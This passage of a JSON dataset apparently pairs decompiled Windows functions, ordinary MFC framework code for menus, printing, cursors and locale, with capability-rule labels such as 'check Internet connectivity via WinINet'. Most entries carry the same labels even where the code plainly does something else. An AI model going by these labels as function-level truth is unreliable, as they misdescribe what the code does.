}\n    iVar4 = fcn.00430e98(0x411e5c);\n    if (iVar4 != 0) {\n        piStack16 = *(iVar4 + 0x60);\n        (**(*param_1 + 0x110))(*(iVar4 + 0x5c));\n        return;\n    }\n    piStack16 = 0x4b62b8;\n    fcn.0046230a(&stack0xfffffff0, 0x4a76e8);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 497
    },
    "00422d34": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00422d34(int32_t param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    if (*(param_1 + 0xd4) == 0) {\n        if (param_2 != NULL) {\n            *param_2 = 0;\n        }\n        iVar1 = 0;\n    }\n    else {\n        uVar2 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0xd4), 0x229, 0, param_2);\n        iVar1 = fcn.004185ec(uVar2);\n        if ((((iVar1 != 0) && (*(iVar1 + 0xd8) != 0)) && (uVar3 = fcn.0041be35(),  (uVar3 & 0x10000000) == 0)) &&\n           (iVar1 = 0,  param_2 != NULL)) {\n            *param_2 = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 242
    },
    "0042394a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042394a(int32_t arg_8h, int32_t arg_ch)\n\n{\n    bool bVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    in_ECX[0x36] = 0;\n    fcn.004236bf(0);\n    piVar2 = fcn.0041f9b5();\n    if ((arg_8h == 0) && (piVar2 != NULL)) {\n        (**(*piVar2 + 0x160))(0, piVar2, piVar2);\n    }\n    bVar1 = false;\n    if (in_ECX[0x20] != NULL) {\n        iVar3 = (**(*in_ECX[0x20] + 0x5c))(arg_8h);\n        if (iVar3 != 0) {\n            bVar1 = true;\n            goto code_r0x004239bc;\n        }\n    }\n    uVar4 = 0;\n    if ((arg_8h != 0) || (arg_ch != 0)) {\n        uVar4 = 1;\n    }\n    (**(*in_ECX + 0x160))(uVar4);\ncode_r0x004239bc:\n    if ((arg_8h != 0) && (piVar2 != NULL)) {\n        uVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        iVar3 = fcn.004185c5(uVar4);\n        iVar5 = fcn.00422ec6();\n        if (iVar5 == iVar3) {\n            (**(*piVar2 + 0x160))(1, piVar2, piVar2);\n        }\n    }\n    if (!bVar1) {\n        (**(*in_ECX + 0x178))(arg_8h, arg_ch, 0);\n        iVar3 = fcn.00422ec6();\n        (*_sym.imp.USER32.dll_DrawMenuBar)(*(iVar3 + 0x20));\n    }\n    return;\n}\n",
        "token_count": 469
    },
    "00423f9a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00423f9a(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (arg_ch == 0) {\n        uVar1 = 0;\n    }\n    else {\n        if (arg_10h != 0) {\n            do {\n                arg_10h = arg_10h + -1;\n                arg_ch = fcn.00463968(arg_ch, arg_14h);\n                if (arg_ch == 0) {\n                    fcn.0041372f();\n                    return 0;\n                }\n                arg_ch = arg_ch + 1;\n            } while (arg_10h != 0);\n        }\n        iVar2 = fcn.00463968(arg_ch, arg_14h);\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_ch);\n        }\n        else {\n            iVar2 = iVar2 - arg_ch;\n        }\n        uVar1 = fcn.00415261(iVar2, iVar2, arg_ch, iVar2);\n        fcn.0041314e(uVar1);\n        fcn.00414de4(0xffffffff);\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 302
    },
    "0042432d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0042432d(int32_t *param_1, int32_t param_2, uint param_3, uint *param_4)\n\n{\n    int32_t iVar1;\n    uint *extraout_ECX;\n    uint *extraout_ECX_00;\n    int32_t unaff_retaddr;\n    uint in_stack_fffffff0;\n    \n    if (param_4 == NULL) {\n        fcn.00401280(0x80004005);\n        param_4 = extraout_ECX;\n    }\n    if ((unaff_retaddr == 0) && (param_2 != 0)) {\n        in_stack_fffffff0 = 0x80070057;\n        fcn.00401280(0x80070057);\n        param_4 = extraout_ECX_00;\n    }\n    iVar1 = (***param_4)(param_2, 2);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00413724();\n    }\n    *param_1 = iVar1 + 0x10;\n    fcn.004136fd(param_2);\n    fcn.004130b8(*param_1, param_2, in_stack_fffffff0, param_2);\n    return param_1;\n}\n",
        "token_count": 283
    },
    "00424390": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00424390(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0042428b();\n    *param_1 = iVar1;\n    if ((*param_2 != 0) && (iVar1 == 0)) {\n        fcn.00401280(0x8007000e);\n    }\n    return param_1;\n}\n",
        "token_count": 103
    },
    "00424478": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424478(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    \n    if (arg_ch == 0) {\n        fcn.00413786();\n    }\n    else {\n        if (arg_8h == 0) {\n            fcn.00401280(0x80070057);\n        }\n        uVar1 = *(*in_ECX + -0xc);\n        uVar3 = arg_8h - *in_ECX >> 1;\n        iVar2 = fcn.00413945(arg_ch);\n        if (uVar1 < uVar3) {\n            fcn.004130b8(iVar2, arg_ch, arg_8h, arg_ch);\n        }\n        else {\n            fcn.004240fd(iVar2, arg_ch, iVar2 + uVar3 * 2);\n        }\n        fcn.004136fd(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "00424d9a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424d9a(int32_t param_1)\n\n{\n    if (*(param_1 + 0x88) != NULL) {\n        (**(**(param_1 + 0x88) + 0x14))();\n    }\n    if (*(param_1 + 0x94) != 0) {\n        fcn.0043c6cf(\"Settings\", \"PreviewPages\", *(param_1 + 0x94));\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00424f2f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424f2f(uint lpString2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalLock;\n    if (*(in_ECX + 0x74) != 0) {\n        var_4h = in_ECX;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(in_ECX + 0x74));\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*(iVar2 + 2) + iVar2, lpString2);\n        if ((iVar2 == 0) && (iVar2 = sub.WINSPOOL.DRV_OpenPrinterA(lpString2, &var_4h, 0),  iVar2 != 0)) {\n            if (*(in_ECX + 0x70) != 0) {\n                fcn.004304e4(*(in_ECX + 0x70));\n            }\n            uVar3 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, 0, 0, 0);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x42, uVar3);\n            *(in_ECX + 0x70) = uVar3;\n            uVar3 = (*pcVar1)(uVar3);\n            iVar2 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, uVar3, 0, 2);\n            if (iVar2 != 1) {\n                fcn.004304e4(*(in_ECX + 0x70));\n                *(in_ECX + 0x70) = 0;\n            }\n            sub.WINSPOOL.DRV_ClosePrinter(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 428
    },
    "0042533c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00425546)\n\nvoid fcn.0042533c(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    code *pcVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char **in_FS_OFFSET;\n    char *arg_8h;\n    char *pcStack304;\n    char *pcStack300;\n    uint auStack288 [65];\n    uchar uStack28;\n    uchar uStack27;\n    uint32_t uStack8;\n    \n    uStack8 = *0x4b8030 ^ auStack288;\n    auStack288[0] = 0x58;\n    fcn.004627af();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    pcStack300 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    arg_8h = pcStack300;\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (pcVar3 == NULL) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (iVar5 < 0) {\n            pcStack304 = &stack0xfffffec8;\n            arg_8h = NULL;\n            iVar5 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n            if (iVar5 == 0) {\n                iVar5 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)();\n                if (((iVar5 == 0) && (*0x10 == 0x165)) &&\n                   (iVar5 = fcn.00463f23(),  pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale,  iVar5 == 1)) {\n                    (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)();\n                    (*pcVar1)();\n                    pcStack304 = 0x2;\n                }\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n            }\n        }\n        else {\n            pcStack304 = \"ntdll.dll\";\n            iVar5 = (*pcVar1)();\n            if (iVar5 != 0) {\n                (*_sym.imp.KERNEL32.dll_EnumResourceLanguagesA)();\n            }\n        }\n    }\n    else {\n        (*pcVar3)();\n        pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale;\n        (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)();\n        (*pcVar1)();\n        arg_8h = \"GetSystemDefaultUILanguage\";\n        pcStack304 = 0x2;\n        pcVar4 = (*pcVar4)();\n        if (pcVar4 != NULL) {\n            (*pcVar4)();\n            (*pcVar1)();\n            (*pcVar1)();\n            pcStack304 = 0x4;\n        }\n    }\n    iVar5 = pcStack304 * 4;\n    pcStack304 = pcStack304 + 1;\n    *(&stack0xfffffeac + iVar5) = 0x800;\n    uStack27 = 0;\n    uStack28 = 0;\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n    if (iVar5 != 0) {\n        fcn.00462290();\n        fcn.0042494c();\n        cVar2 = fcn.004249fc();\n        if (cVar2 != '\\0') {\n            fcn.00424a32();\n        }\n        iVar5 = 0;\n        if (0 < pcStack304) {\n            do {\n                iVar6 = fcn.00425019(*(&stack0xfffffeac + iVar5 * 4));\n                if (iVar6 != 0) break;\n                iVar5 = iVar5 + 1;\n            } while (iVar5 < pcStack304);\n        }\n        fcn.004250e6();\n    }\n    *in_FS_OFFSET = pcStack300;\n    fcn.0045e747(arg_8h);\n    return;\n}\n",
        "token_count": 877
    },
    "0042597b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042597b(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x50) == 0) {\n        uVar1 = fcn.004182f8(\"CommDlgExtendedError\");\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        *(param_1 + 0x50) = uVar1;\n    }\n    *param_2 = *(param_1 + 0x50);\n    return;\n}\n",
        "token_count": 126
    },
    "00425a15": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00425a15(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        bVar2 = *(unaff_EBP + -0x1c) != 0;\n        if (bVar2) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        fcn.0042f689(0, *(unaff_EBP + -0x20));\n        if (!bVar2) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00425dcf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425dcf(int32_t param_1)\n\n{\n    if (*(param_1 + 0x58) != 0) {\n    // WARNING: Could not recover jumptable at 0x00425dda. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(**(param_1 + 0x58) + 0x34))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "00425df1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425df1(int32_t param_1)\n\n{\n    int32_t extraout_ECX;\n    \n    if (*(param_1 + 0x58) == 0) {\n        fcn.00411e42();\n        param_1 = extraout_ECX;\n    }\n    // WARNING: Could not recover jumptable at 0x00425e05. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x58) + 0x2c))();\n    return;\n}\n",
        "token_count": 126
    },
    "00425eca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425eca(int32_t param_1)\n\n{\n    if (*(param_1 + 0x58) != 0) {\n    // WARNING: Could not recover jumptable at 0x00425ed5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(**(param_1 + 0x58) + 0x24))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "00426006": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00426006(uint param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.004122c3();\n    if (piVar1 != NULL) {\n        iVar2 = (**(*piVar1 + 0x120))();\n        if ((iVar2 != 0) && (piVar1[0x20] != NULL)) {\n            (**(*piVar1[0x20] + 100))(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "004260e5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004260e5(int32_t param_1, uint param_2, uint32_t param_3, int32_t param_4)\n\n{\n    int32_t hWnd;\n    int32_t iVar1;\n    int32_t *piVar2;\n    uchar *lpCaption;\n    int32_t *arg_8h;\n    int32_t iStack280;\n    int32_t iStack276;\n    int32_t iStack272;\n    uchar auStack268 [108];\n    uchar auStack160 [151];\n    uchar uStack9;\n    uint32_t uStack8;\n    \n    uStack8 = *0x4b8030 ^ auStack160;\n    fcn.00426006(0);\n    arg_8h = &iStack272;\n    hWnd = fcn.0042603a(0);\n    if (hWnd != iStack272) {\n        (*_sym.imp.USER32.dll_EnableWindow)(hWnd, 1);\n    }\n    iStack280 = 0;\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(hWnd, &iStack280);\n    if ((((hWnd == 0) || (iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(),  iStack280 != iVar1)) ||\n        (piVar2 = (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0x376, 0, 0),  piVar2 == NULL)) &&\n       (piVar2 = NULL,  param_1 != 0)) {\n        piVar2 = param_1 + 0x78;\n    }\n    iStack276 = 0;\n    if ((piVar2 != NULL) && (iStack276 = *piVar2,  param_4 != 0)) {\n        *piVar2 = param_4 + 0x30000;\n    }\n    if ((param_3 & 0xf0) == 0) {\n        if ((param_3 & 0xf) < 2) {\n            param_3 = param_3 | 0x30;\n        }\n        else if ((param_3 & 0xf) - 3 < 2) {\n            param_3 = param_3 | 0x20;\n        }\n    }\n    auStack268[0] = 0;\n    if (param_1 == 0) {\n        lpCaption = auStack268;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, lpCaption, 0x104);\n        if (iVar1 == 0x104) {\n            uStack9 = 0;\n        }\n    }\n    else {\n        lpCaption = *(param_1 + 0x50);\n    }\n    fcn.00416b7b(hWnd, param_2, lpCaption, param_3);\n    if (piVar2 != NULL) {\n        *piVar2 = iStack276;\n    }\n    if (iStack272 != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(iStack272, 1);\n    }\n    fcn.00426006(1);\n    fcn.0045e747(arg_8h);\n    return;\n}\n",
        "token_count": 693
    },
    "00426972": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00426972(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    bool bVar2;\n    uint var_4h;\n    \n    fcn.004627e2(0x10);\n    *(unaff_EBP + -4) = 0;\n    fcn.00432b33();\n    fcn.00432da4(0xffffffff);\n    *(unaff_EBP + -4) = 2;\n    if (*(unaff_EBP + 8) == 0) {\n        iVar1 = fcn.004302e1();\n        if ((iVar1 != 0) && (*(iVar1 + 0x3c) != NULL)) {\n            (**(**(iVar1 + 0x3c) + 0x60))();\n            if (*(iVar1 + 0x3c) != NULL) {\n                (**(**(iVar1 + 0x3c) + 4))(1);\n            }\n            *(iVar1 + 0x3c) = 0;\n        }\n    }\n    bVar2 = *0x4bb630 != 0;\n    *(unaff_EBP + -4) = 4;\n    if (bVar2) {\n        fcn.00430e3f(*(unaff_EBP + 8), 0);\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 325
    },
    "00426c77": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00426c77(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    iVar1 = fcn.004302e1();\n    if (((*(iVar1 + 4) != 0) && (*param_1 == 0)) && (iVar1 = fcn.00426b37(param_1),  iVar1 != 0)) {\n        return 1;\n    }\n    piVar2 = fcn.004122c3();\n    piVar4 = piVar2;\n    if (piVar2 != NULL) {\n        piVar4 = piVar2[8];\n    }\n    iVar1 = fcn.00418b03(piVar4, param_1);\n    if (iVar1 == 0) {\n        if (piVar2 != NULL) {\n            fcn.004185c5(*param_1);\n            piVar4 = fcn.00419eed();\n            if (piVar4 != piVar2) {\n                uVar3 = (**(*piVar2 + 0x100))(param_1);\n                return uVar3;\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 297
    },
    "00426d85": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00426d85(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_retaddr;\n    \n    iVar2 = fcn.004302e1();\n    piVar1 = *(iVar2 + 4);\n    if (piVar1 != NULL) {\n        if (piVar1[0xf] != NULL) {\n            (*piVar1[0xf])(1, 0);\n        }\n        if (param_2 != 0) {\n            (**(*piVar1 + 0x78))();\n        }\n        *(iVar2 + 4) = 0;\n    }\n    fcn.00426972(0);\n    fcn.00463fb3(unaff_retaddr);\n    return;\n}\n",
        "token_count": 177
    },
    "00427084": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00427084(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0043026e();\n    if (*(iVar1 + 0x14) == '\\0') {\n        iVar1 = fcn.0042fcbb();\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        uVar2 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(0xffffffff, 0x426ef0, 0, uVar2);\n        *(iVar1 + 0x2c) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "0042754d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042754d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    fcn.004408c6();\n    if ((*(param_1 + 0x40) != 0) && (*(param_1 + 0x68) == 0)) {\n        iVar1 = fcn.0043026e();\n        uVar3 = *(iVar1 + 0xc);\n        uVar2 = (*_sym.imp.USER32.dll_LoadMenuA)(uVar3, *(param_1 + 0x40));\n        *(param_1 + 0x68) = uVar2;\n        uVar3 = (*_sym.imp.USER32.dll_LoadAcceleratorsA)(uVar3, *(param_1 + 0x40));\n        *(param_1 + 0x6c) = uVar3;\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "00427884": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427884(int32_t param_1)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint arg_8h;\n    uint lpvBits;\n    int16_t aiStack16 [4];\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    arg_8h = 5;\n    fcn.0043039f();\n    if (*0x4bb258 == 0) {\n        if (*0x4bb248 == 0) {\n            iVar2 = 0x1111;\n            iVar3 = 0;\n            do {\n                *(&lpvBits + iVar3 * 2) = iVar2;\n                aiStack16[iVar3] = iVar2;\n                iVar2 = iVar2 * 2;\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 4);\n            puVar4 = &lpvBits;\n            iVar3 = (*_sym.imp.GDI32.dll_CreateBitmap)(8, 8, 1, 1, puVar4);\n            if (iVar3 == 0) {\n                fcn.0043040c(5);\n                fcn.0042d7eb();\n            }\n            *0x4bb248 = (*_sym.imp.GDI32.dll_CreatePatternBrush)(iVar3);\n            (*_sym.imp.GDI32.dll_DeleteObject)(iVar3);\n            if (*0x4bb248 == 0) {\n                fcn.0043040c(puVar4, 5);\n                fcn.0042d7eb();\n            }\n        }\n        if (*0x4bb24c == 0) {\n            uVar5 = 0;\n            *0x4bb24c = (*_sym.imp.GDI32.dll_CreatePen)(2, 0, 0);\n            if (*0x4bb24c == 0) {\n                fcn.0043040c(uVar5, 5);\n                fcn.0042d7eb();\n            }\n        }\n        iVar3 = fcn.0043026e();\n        pcVar1 = _sym.imp.USER32.dll_LoadCursorA;\n        uVar5 = *(iVar3 + 0xc);\n        *0x4bb220 = (*_sym.imp.USER32.dll_LoadCursorA)(uVar5, 0x7907);\n        *0x4bb224 = (*pcVar1)(uVar5, 0x7908);\n        *0x4bb228 = *0x4bb220;\n        *0x4bb22c = *0x4bb224;\n        *0x4bb230 = (*pcVar1)(uVar5, 0x7909);\n        *0x4bb234 = (*pcVar1)(uVar5, 0x790a);\n        *0x4bb238 = *0x4bb230;\n        *0x4bb23c = *0x4bb234;\n        *0x4bb240 = (*pcVar1)(uVar5, 0x790b);\n        *0x4bb244 = (*pcVar1)(uVar5, 0x790c);\n        *0x4bb250 = (*_sym.imp.KERNEL32.dll_GetProfileIntA)(0x495474, \"oleinplaceborderwidth\", 4);\n        *0x4bb258 = 1;\n    }\n    if (*0x4bb254 == '\\0') {\n        iVar3 = fcn.0045f38e(0x427789);\n        *0x4bb254 = '\\x01' - (iVar3 != 0);\n    }\n    fcn.0043040c(5);\n    *(param_1 + 4) = 0;\n    iVar3 = *0x4bb250;\n    *(param_1 + 0x20) = *0x4bb250;\n    *(param_1 + 0x18) = iVar3 * 2;\n    *(param_1 + 0x1c) = iVar3 * 2;\n    (*_sym.imp.USER32.dll_SetRectEmpty)(param_1 + 0x28);\n    *(param_1 + 0x3c) = 0;\n    *(param_1 + 0x38) = 0;\n    *(param_1 + 0x40) = 0;\n    *(param_1 + 0x44) = 0;\n    fcn.0045e747(arg_8h);\n    return;\n}\n",
        "token_count": 1012
    },
    "00427ed1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
